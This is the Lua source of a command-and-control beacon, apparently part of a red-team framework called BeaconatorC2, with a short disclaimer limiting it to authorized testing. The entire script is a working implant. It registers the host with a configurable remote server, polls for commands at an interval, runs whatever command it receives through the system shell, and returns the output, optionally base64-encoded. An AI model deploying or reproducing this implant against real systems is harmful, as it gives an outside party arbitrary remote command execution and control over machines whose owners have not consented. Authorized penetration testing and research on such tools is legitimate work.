--[[
Simple Lua Beacon for BeaconatorC2
TCP beacon with configurable encoding (plaintext/base64)
Designed for testing with portable Lua interpreter
Only use for legal and ethical testing and assessment purposes.

This beacon uses LuaSocket for TCP communication.
Place socket/core.dll next to this script for portable deployment.

Usage: lua simple_lua_beacon.lua [server_ip] [port] [encoding] [interval]
Example: lua simple_lua_beacon.lua 192.168.1.100 5074 plaintext 15
--]]

-- Configure Lua to find socket DLL in local directories
-- This allows portable deployment with socket/core.dll in the same folder
local script_path = debug.getinfo(1, "S").source:match("@?(.*[\\/])") or "./"
package.cpath = package.cpath .. ";" .. script_path .. "socket/?.dll;" .. script_path .. "?.dll"
package.cpath = package.cpath .. ";" .. script_path .. "socket\\?.dll;" .. script_path .. "?.dll"
package.path = package.path .. ";" .. script_path .. "socket/?.lua;" .. script_path .. "?.lua"
package.path = package.path .. ";" .. script_path .. "socket\\?.lua;" .. script_path .. "?.lua"

-- Global configuration
local config = {
    server_ip = "127.0.0.1",
    server_port = 5074,
    encoding = "plaintext",
    check_in_interval = 15,
    beacon_id = "",
    computer_name = ""
}

-- Diagnostic function to check for socket DLL
local function diagnose_socket_loading()
    print("\n=== LuaSocket Diagnostic Information ===")
    print("Script path: " .. script_path)
    print("\nCurrent working directory:")
    local handle = io.popen("cd")
    if handle then
        print("  " .. handle:read("*l"))
        handle:close()
    end

    print("\nLua version: " .. _VERSION)
    print("\nLua C search paths (package.cpath):")
    for path in string.gmatch(package.cpath, "[^;]+") do
        print("  " .. path)
    end

    print("\nLua script search paths (package.path):")
    for path in string.gmatch(package.path, "[^;]+") do
        print("  " .. path)
    end

    print("\nChecking for socket/core.dll in expected locations:")
    local possible_paths = {
        script_path .. "socket\\core.dll",
        script_path .. "socket/core.dll",
        ".\\socket\\core.dll",
        "./socket/core.dll",
        "socket\\core.dll",
        "socket/core.dll"
    }

    for _, path in ipairs(possible_paths) do
        local f = io.open(path, "r")
        if f then
            print("  [FOUND] " .. path)
            f:close()
        else
            print("  [NOT FOUND] " .. path)
        end
    end

    print("\nTrying to load socket.core directly:")
    local core_ok, core_err = pcall(require, "socket.core")
    if core_ok then
        print("  [SUCCESS] socket.core loaded")
    else
        print("  [FAILED] " .. tostring(core_err))
    end

    print("\nTrying to load socket:")
    local socket_ok, socket_err = pcall(require, "socket")
    if socket_ok then
        print("  [SUCCESS] socket loaded")
    else
        print("  [FAILED] " .. tostring(socket_err))
    end

    print("========================================\n")
end

-- Try to load socket module
local socket_ok, socket_or_err = pcall(require, "socket")
if not socket_ok then
    print("[!] ERROR: LuaSocket library not found!")
    print("[!] Error message: " .. tostring(socket_or_err))
    print("")

    -- Run diagnostics
    diagnose_socket_loading()

    print("\n[!] Troubleshooting Tips:")
    print("[!] 1. Ensure socket/core.dll is in the same directory as this script")
    print("[!] 2. Check that the DLL matches your Lua version (" .. _VERSION .. ")")
    print("[!] 3. Check if it's 32-bit vs 64-bit mismatch")
    print("[!] 4. Try running: lua -e \"print(package.cpath)\" to see default paths")
    print("[!] 5. The DLL may have missing dependencies (use Dependency Walker)")
    print("[!]")
    print("[!] Download from: https://github.com/lunarmodules/luasocket/releases")
    os.exit(1)
end

local socket = socket_or_err

-- Pure Lua Base64 Implementation
local base64 = {}

base64.chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'

function base64.encode(data)
    local bytes = {}
    local result = ""

    for i = 1, #data do
        bytes[#bytes + 1] = string.byte(data, i)
    end

    for i = 1, #bytes, 3 do
        local b1, b2, b3 = bytes[i], bytes[i+1], bytes[i+2]
        local n = b1 * 65536 + (b2 or 0) * 256 + (b3 or 0)

        local c1 = math.floor(n / 262144) % 64
        local c2 = math.floor(n / 4096) % 64
        local c3 = math.floor(n / 64) % 64
        local c4 = n % 64

        result = result .. base64.chars:sub(c1 + 1, c1 + 1)
        result = result .. base64.chars:sub(c2 + 1, c2 + 1)
        result = result .. (b2 and base64.chars:sub(c3 + 1, c3 + 1) or '=')
        result = result .. (b3 and base64.chars:sub(c4 + 1, c4 + 1) or '=')
    end

    return result
end

function base64.decode(data)
    data = string.gsub(data, '[^'..base64.chars..'=]', '')
    local result = ""

    for i = 1, #data, 4 do
        local c1 = base64.chars:find(data:sub(i, i)) - 1
        local c2 = base64.chars:find(data:sub(i+1, i+1)) - 1
        local c3 = base64.chars:find(data:sub(i+2, i+2))
        local c4 = base64.chars:find(data:sub(i+3, i+3))

        c3 = c3 and (c3 - 1) or 0
        c4 = c4 and (c4 - 1) or 0

        local n = c1 * 262144 + c2 * 4096 + c3 * 64 + c4
        local b1 = math.floor(n / 65536)
        local b2 = math.floor(n / 256) % 256
        local b3 = n % 256

        result = result .. string.char(b1)
        if data:sub(i+2, i+2) ~= '=' then
            result = result .. string.char(b2)
        end
        if data:sub(i+3, i+3) ~= '=' then
            result = result .. string.char(b3)
        end
    end

    return result
end

-- Logging function
local function get_script_path()
    local str = debug.getinfo(2, "S").source:sub(2)
    return str:match("(.*/)")  or str:match("(.*\\)") or "./"
end

local log_file_path = get_script_path() .. "beacon.log"

local function log(message)
    local timestamp = os.date("%Y-%m-%d %H:%M:%S")
    local log_message = string.format("[%s] %s", timestamp, message)

    -- Write to file
    local file = io.open(log_file_path, "a")
    if file then
        file:write(log_message .. "\n")
        file:close()
    end

    -- Print to console
    print(log_message)
end

-- Generate beacon ID
local function generate_beacon_id()
    local computer_name = config.computer_name
    local username = os.getenv("USER") or os.getenv("USERNAME") or "unknown"
    local script_path = debug.getinfo(1, "S").source

    -- Create hash from system info
    local system_info = computer_name .. username .. script_path
    local hash = 0

    for i = 1, #system_info do
        local byte = string.byte(system_info, i)
        hash = (hash * 31 + byte) % 4294967296
    end

    -- Convert to 8-character hex string
    return string.format("%08x", hash):sub(1, 8)
end

-- Get computer name
local function get_computer_name()
    -- Try Windows
    local comp_name = os.getenv("COMPUTERNAME")
    if comp_name then
        return comp_name
    end

    -- Try Unix/Linux/macOS
    local handle = io.popen("hostname 2>/dev/null")
    if handle then
        local result = handle:read("*l")
        handle:close()
        if result and result ~= "" then
            return result
        end
    end

    return "unknown"
end

-- Message encoding/decoding
local function encode_message(message)
    if config.encoding == "base64" then
        return base64.encode(message)
    else
        return message
    end
end

local function decode_message(message)
    if config.encoding == "base64" then
        local success, result = pcall(base64.decode, message)
        if success then
            return result
        else
            log("Base64 decode error, treating as plaintext")
            return message
        end
    else
        return message
    end
end

-- TCP Communication
local function send_tcp_message(message, expect_response)
    local success, result = pcall(function()
        -- Encode message
        local encoded_message = encode_message(message)

        -- Create TCP socket
        local tcp = assert(socket.tcp())
        tcp:settimeout(30)

        -- Connect to server
        local connect_result, err_msg = tcp:connect(config.server_ip, config.server_port)
        if not connect_result then
            error("Connection failed: " .. (err_msg or "unknown error"))
        end

        -- Send message
        tcp:send(encoded_message)

        if expect_response then
            -- Receive response
            local response, err_msg = tcp:receive("*a")
            tcp:close()

            if not response then
                error("Receive failed: " .. (err_msg or "unknown error"))
            end

            -- Decode and return response
            local decoded_response = decode_message(response)
            return decoded_response
        else
            tcp:close()
            return "OK"
        end
    end)

    if success then
        return result
    else
        log("TCP Error: " .. tostring(result))
        return "ERROR: " .. tostring(result)
    end
end

-- Register beacon with server
local function register_beacon()
    local message = string.format("register|%s|%s", config.beacon_id, config.computer_name)
    log("Registering with message: " .. message)

    if config.encoding == "base64" then
        log("Encoded message: " .. encode_message(message))
    end

    local response = send_tcp_message(message, true)
    log("Registration response: " .. tostring(response))
    return response
end

-- Request action from server
local function request_action()
    local message = string.format("request_action|%s", config.beacon_id)
    log("Requesting action: " .. message)

    if config.encoding == "base64" then
        log("Encoded message: " .. encode_message(message))
    end

    local response = send_tcp_message(message, true)
    log("Action response: " .. tostring(response))
    return response
end

-- Execute system command
local function execute_command(command)
    log("Executing: " .. command)

    local handle = io.popen(command .. " 2>&1")
    if not handle then
        return "ERROR: Failed to execute command"
    end

    local output = handle:read("*a")
    handle:close()

    if output == "" then
        output = "Command executed (no output)"
    end

    return output
end

-- Send command output to server
local function send_command_output(output)
    local message = string.format("command_output|%s|%s", config.beacon_id, output)
    log(string.format("Sending command output: %d characters", #output))

    if config.encoding == "base64" then
        log(string.format("Encoded message length: %d characters", #encode_message(message)))
    end

    local response = send_tcp_message(message, false)
    return response
end

-- Process command from server
local function process_command(command_data)
    -- Check for no command responses
    if not command_data or command_data == "" or command_data == "no_pending_commands" then
        return
    end

    log("Processing: " .. command_data)

    local cmd = nil

    -- Handle execute_command| prefix
    if command_data:match("^execute_command|") then
        cmd = command_data:match("^execute_command|(.+)$")
    -- Handle simple command (no pipe)
    elseif not command_data:match("|") then
        cmd = command_data
    else
        log("Unknown command format: " .. command_data)
        return
    end

    if cmd then
        local output = execute_command(cmd)
        send_command_output(output)
    end
end

-- Parse command-line arguments
local function parse_arguments()
    if arg[1] then config.server_ip = arg[1] end
    if arg[2] then config.server_port = tonumber(arg[2]) end
    if arg[3] then config.encoding = string.lower(arg[3]) end
    if arg[4] then config.check_in_interval = tonumber(arg[4]) end

    -- Validate encoding
    if config.encoding ~= "plaintext" and config.encoding ~= "base64" then
        log("Invalid encoding: " .. config.encoding .. ". Must be 'plaintext' or 'base64'")
        os.exit(1)
    end
end

-- Main beacon loop
local function run_beacon()
    log("Starting simple Lua beacon...")
    log("Beacon ID: " .. config.beacon_id)
    log("Computer: " .. config.computer_name)
    log("Server: " .. config.server_ip .. ":" .. config.server_port)
    log("Encoding: " .. config.encoding:upper())
    log("Check-in interval: " .. config.check_in_interval .. " seconds")

    -- Initial registration
    register_beacon()

    -- Main loop
    while true do
        local success, err = pcall(function()
            log("Starting beacon cycle...")

            -- Request action from server
            local action = request_action()

            if action and not action:match("^ERROR") then
                process_command(action)
            elseif action and action:match("^ERROR") then
                log("Communication error: " .. action)
                log("Will retry in next cycle...")
            end

            -- Wait before next cycle
            log(string.format("Waiting %d seconds before next cycle...", config.check_in_interval))
            socket.sleep(config.check_in_interval)
        end)

        if not success then
            log("Beacon error: " .. tostring(err))
            socket.sleep(5)
        end
    end
end

-- Main entry point
local function main()
    parse_arguments()
    config.computer_name = get_computer_name()
    config.beacon_id = generate_beacon_id()

    local success, err = pcall(run_beacon)

    if not success then
        log("Fatal beacon error: " .. tostring(err))
        os.exit(1)
    end
end

-- Run the beacon
main()
